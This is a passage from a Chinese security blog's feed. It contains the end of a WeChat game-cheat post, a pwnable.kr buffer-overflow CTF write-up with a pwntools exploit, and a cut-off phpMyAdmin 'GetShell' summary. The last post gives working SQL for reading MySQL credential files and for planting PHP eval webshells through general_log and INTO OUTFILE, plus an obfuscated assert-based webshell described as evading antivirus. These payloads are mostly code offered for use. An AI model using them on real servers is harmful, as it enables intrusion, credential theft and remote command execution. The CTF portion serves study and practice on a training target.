<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZE5tazVhVmRLa1lZSVdmdGg0emgzZVFOYnlOMTRzMkpBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">shell.png</a></p>
<p>最后就是启动waigua输入参数即可~<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./youjumpijump</div><div class="line">2.04</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUI1d05VS3ZGNnJtZFlzVkRjVHNzcERoMTdTdmttVlBCVWNFVysyYjA3SmlBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">result.png</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题&lt;br&gt;就来写一篇指导文章&lt;/p&gt;
&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h3&gt;&lt;p&gt;1.逍遥模拟器并启动Android5.1系统&lt;br&gt;2.jump文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="WeChat" scheme="http://iosmosis.github.io/tags/WeChat/"/>
    
      <category term="AI外挂" scheme="http://iosmosis.github.io/tags/AI%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>post</title>
    <link href="http://iosmosis.github.io/2017/12/30/Rop3/"/>
    <id>http://iosmosis.github.io/2017/12/30/Rop3/</id>
    <published>2017-12-30T07:52:23.000Z</published>
    <updated>2017-12-30T07:52:23.650Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable-Bof writeup</title>
    <link href="http://iosmosis.github.io/2017/12/23/bof/"/>
    <id>http://iosmosis.github.io/2017/12/23/bof/</id>
    <published>2017-12-23T11:55:02.000Z</published>
    <updated>2017-12-23T11:59:20.844Z</updated>
    
    <content type="html"><![CDATA[<p>个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点</p>
<h3 id="题目网站：http-pwnable-kr"><a href="#题目网站：http-pwnable-kr" class="headerlink" title="题目网站：http://pwnable.kr"></a>题目网站：<a href="http://pwnable.kr" target="_blank" rel="external">http://pwnable.kr</a></h3><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Bof      32位经典缓冲区溢出题目</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>因为题目提供了源码所以先看看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">	gets(overflowme);	<span class="comment">// smash me!</span></div><div class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">		system(<span class="string">"/bin/sh"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">	func(<span class="number">0xdeadbeef</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><a id="more"></a>
可以看到关键点gets函数这里 可能会引起缓冲区溢出 </li>
</ul>
<p>接着丢bof到gdb 查看下汇编代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass main</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x0000068a &lt;+0&gt;:	push   ebp</div><div class="line">   0x0000068b &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x0000068d &lt;+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x00000690 &lt;+6&gt;:	sub    esp,0x10</div><div class="line">   0x00000693 &lt;+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">   0x0000069a &lt;+16&gt;:	call   0x62c &lt;func&gt;</div><div class="line">   0x0000069f &lt;+21&gt;:	mov    eax,0x0</div><div class="line">   0x000006a4 &lt;+26&gt;:	leave  </div><div class="line">   0x000006a5 &lt;+27&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>当0xdeadbeef作为参数传递时，它会在调用func之前添加到堆栈中  然后在这里下断查看下它在哪</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">gdb-peda$ b *main+16</div><div class="line">Breakpoint 1 at 0x69a</div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ios/bof </div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xf7fb9dbc --&gt; 0xffffd13c --&gt; 0xffffd31a (<span class="string">"XDG_VTNR=7"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x5bca2c32 </div><div class="line">EDX: 0xffffd0c4 --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">EIP: 0x5655569a (&lt;main+16&gt;:	call   0x5655562c &lt;func&gt;)</div><div class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x5655568d &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x56555690 &lt;main+6&gt;:	sub    esp,0x10</div><div class="line">   0x56555693 &lt;main+9&gt;:	mov    DWORD PTR [esp],0xdeadbeef</div><div class="line">=&gt; 0x5655569a &lt;main+16&gt;:	call   0x5655562c &lt;func&gt;</div><div class="line">   0x5655569f &lt;main+21&gt;:	mov    eax,0x0</div><div class="line">   0x565556a4 &lt;main+26&gt;:	leave  </div><div class="line">   0x565556a5 &lt;main+27&gt;:	ret    </div><div class="line">   0x565556a6:	nop</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xdeadbeef </div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd080 --&gt; 0xdeadbeef </div><div class="line">0004| 0xffffd084 (<span class="string">"PRUV\271VUV"</span>)</div><div class="line">0008| 0xffffd088 --&gt; 0x565556b9 (&lt;__libc_csu_init+9&gt;:	add    ebx,0x193b)</div><div class="line">0012| 0xffffd08c --&gt; 0x0 </div><div class="line">0016| 0xffffd090 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0020| 0xffffd094 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0024| 0xffffd098 --&gt; 0x0 </div><div class="line">0028| 0xffffd09c --&gt; 0xf7e20637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, 0x5655569a <span class="keyword">in</span> main ()</div></pre></td></tr></table></figure>
<p>可以看到，传入func之前他在ESP: 0xffffd080 –&gt; 0xdeadbeef<br>然后汇编看下func<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disass func</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</div><div class="line">   0x5655562c &lt;+0&gt;:	push   ebp</div><div class="line">   0x5655562d &lt;+1&gt;:	mov    ebp,esp</div><div class="line">   0x5655562f &lt;+3&gt;:	sub    esp,0x48</div><div class="line">   0x56555632 &lt;+6&gt;:	mov    eax,gs:0x14</div><div class="line">   0x56555638 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</div><div class="line">   0x5655563b &lt;+15&gt;:	xor    eax,eax</div><div class="line">   0x5655563d &lt;+17&gt;:	mov    DWORD PTR [esp],0x5655578c</div><div class="line">   0x56555644 &lt;+24&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555649 &lt;+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">   0x56555654 &lt;+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">   0x5655566b &lt;+63&gt;:	mov    DWORD PTR [esp],0x565557a3</div><div class="line">   0x56555672 &lt;+70&gt;:	call   0xf7e67140 &lt;puts&gt;</div><div class="line">   0x56555677 &lt;+75&gt;:	mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">   0x5655567a &lt;+78&gt;:	xor    eax,DWORD PTR gs:0x14</div><div class="line">   0x56555681 &lt;+85&gt;:	je     0x56555688 &lt;func+92&gt;</div><div class="line">   0x56555683 &lt;+87&gt;:	call   0xf7efd790 &lt;__stack_chk_fail&gt;</div><div class="line">   0x56555688 &lt;+92&gt;:	leave  </div><div class="line">   0x56555689 &lt;+93&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>在    0x56555654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 处 下断<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ n</div><div class="line">overflow me : </div><div class="line">AAAAAAAAAA</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0xf7fb85a0 --&gt; 0xfbad2288 </div><div class="line">EDX: 0xf7fb987c --&gt; 0x0 </div><div class="line">ESI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EDI: 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">EBP: 0xffffd078 --&gt; 0xffffd098 --&gt; 0x0 </div><div class="line">ESP: 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">EIP: 0x56555654 (&lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)</div><div class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x56555649 &lt;func+29&gt;:	lea    eax,[ebp-0x2c]</div><div class="line">   0x5655564c &lt;func+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x5655564f &lt;func+35&gt;:	call   0xf7e66890 &lt;gets&gt;</div><div class="line">=&gt; 0x56555654 &lt;func+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x5655565b &lt;func+47&gt;:	jne    0x5655566b &lt;func+63&gt;</div><div class="line">   0x5655565d &lt;func+49&gt;:	mov    DWORD PTR [esp],0x5655579b</div><div class="line">   0x56555664 &lt;func+56&gt;:	call   0xf7e42940 &lt;system&gt;</div><div class="line">   0x56555669 &lt;func+61&gt;:	jmp    0x56555677 &lt;func+75&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd030 --&gt; 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">0004| 0xffffd034 --&gt; 0xffffd0d4 --&gt; 0xd28e2a50 </div><div class="line">0008| 0xffffd038 --&gt; 0xf7fb8000 --&gt; 0x1afdb0 </div><div class="line">0012| 0xffffd03c --&gt; 0xd267 </div><div class="line">0016| 0xffffd040 --&gt; 0xffffffff </div><div class="line">0020| 0xffffd044 --&gt; 0x2f (<span class="string">'/'</span>)</div><div class="line">0024| 0xffffd048 --&gt; 0xf7e14dc8 --&gt; 0x2b76 (<span class="string">'v+'</span>)</div><div class="line">0028| 0xffffd04c (<span class="string">"AAAAAAAAAA"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 2, 0x56555654 <span class="keyword">in</span> func ()</div><div class="line">`</div></pre></td></tr></table></figure></p>
<p>AAAAAAAAAA 的指针位于堆栈的顶部，它指向地址ESP: 0xffffd030 –&gt; 0xffffd04c (“AAAAAAAAAA”)</p>
<p>所以可以计算偏移量<br>gdb-peda$ p/d 0xffffd080 - 0xffffd04c<br>$1 = 52</p>
<p>有了偏移量 就可以写payload了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process('./bof')</span></div><div class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</div><div class="line">payload = <span class="string">'A'</span>*<span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>运行结果…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python bof.py</div><div class="line">[+] Opening connection to pwnable.kr on port 9000: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">bof</div><div class="line">bof.c</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">daddy, I just pwned a buFFer :)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;个人比较菜 就想分享下自己的思路和过程 如果有问题欢迎大家批评指点&lt;/p&gt;
&lt;h3 id=&quot;题目网站：http-pwnable-kr&quot;&gt;&lt;a href=&quot;#题目网站：http-pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;题目网站：http://pwnable.kr&quot;&gt;&lt;/a&gt;题目网站：&lt;a href=&quot;http://pwnable.kr&quot;&gt;http://pwnable.kr&lt;/a&gt;&lt;/h3&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;Bof      32位经典缓冲区溢出题目&lt;/p&gt;
&lt;h2 id=&quot;解题过程&quot;&gt;&lt;a href=&quot;#解题过程&quot; class=&quot;headerlink&quot; title=&quot;解题过程&quot;&gt;&lt;/a&gt;解题过程&lt;/h2&gt;&lt;p&gt;因为题目提供了源码所以先看看代码&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; key)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; overflowme[&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	gets(overflowme);	&lt;span class=&quot;comment&quot;&gt;// smash me!&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(key == &lt;span class=&quot;number&quot;&gt;0xcafebabe&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		system(&lt;span class=&quot;string&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Nah..\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	func(&lt;span class=&quot;number&quot;&gt;0xdeadbeef&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="二进制漏洞利用" scheme="http://iosmosis.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="缓冲区溢出" scheme="http://iosmosis.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>关于phpmyadmin GetShell思路总结</title>
    <link href="http://iosmosis.github.io/2017/04/09/mysql/"/>
    <id>http://iosmosis.github.io/2017/04/09/mysql/</id>
    <published>2017-04-08T16:08:16.000Z</published>
    <updated>2017-04-08T16:40:50.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我"><a href="#看了网上的许多文章-总结的不是很到位-这里在根据自己的经验总结一些-如有漏缺-请联系我" class="headerlink" title="看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~"></a>看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~</h3><h1 id="低权限读文件"><a href="#低权限读文件" class="headerlink" title="低权限读文件"></a>低权限读文件</h1><h3 id="用到的mysql语句"><a href="#用到的mysql语句" class="headerlink" title="用到的mysql语句"></a>用到的mysql语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'C:/mysql/data/mysql/user.MYD'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">test</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\0'</span>;</div></pre></td></tr></table></figure>
<h3 id="LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件"><a href="#LOAD-DATA-LOCAL-INFILE-继承的是-执行客户端-用户权限-且只能读-mysql客户端-本地-文件" class="headerlink" title="LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件"></a>LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件</h3><pre><code>webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件
若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE  就不能读该文件
</code></pre><h3 id="使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD"><a href="#使用方法-利用场景-phpmyadmin-或其它可执行sql-命令的-地方并且站库同服务-情况下读取相关配置文件-，或在权限配置不当情况下-读-user-MYD" class="headerlink" title="使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD"></a>使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务  情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h1 id="SQL语句利用日志写shell"><a href="#SQL语句利用日志写shell" class="headerlink" title="SQL语句利用日志写shell"></a>SQL语句利用日志写shell</h1><p>outfile被禁止，或者写入文件被拦截；</p>
<p>在数据库中操作如下：（必须是root权限）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%general%&apos;;  #查看配置</div><div class="line">set global general_log = on;  #开启general log模式</div><div class="line">set global general_log_file = &apos;/var/www/html/1.php&apos;;   #设置日志目录为shell地址</div><div class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;  #写入shell</div></pre></td></tr></table></figure>
<p>SQL查询免杀shell的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;"</span></div></pre></td></tr></table></figure>
<h1 id="getshell-方法"><a href="#getshell-方法" class="headerlink" title="getshell 方法"></a>getshell 方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">方法一：</div><div class="line">CREATE TABLE `mysql`.`io` (`ioi` TEXT NOT NULL );</div><div class="line">INSERT INTO `mysql`.`io` (`ioi` )VALUES (&apos;&lt;?php @eval($_POST[io])?&gt;&apos;);</div><div class="line">SELECT xiaomaFROM study INTO OUTFILE 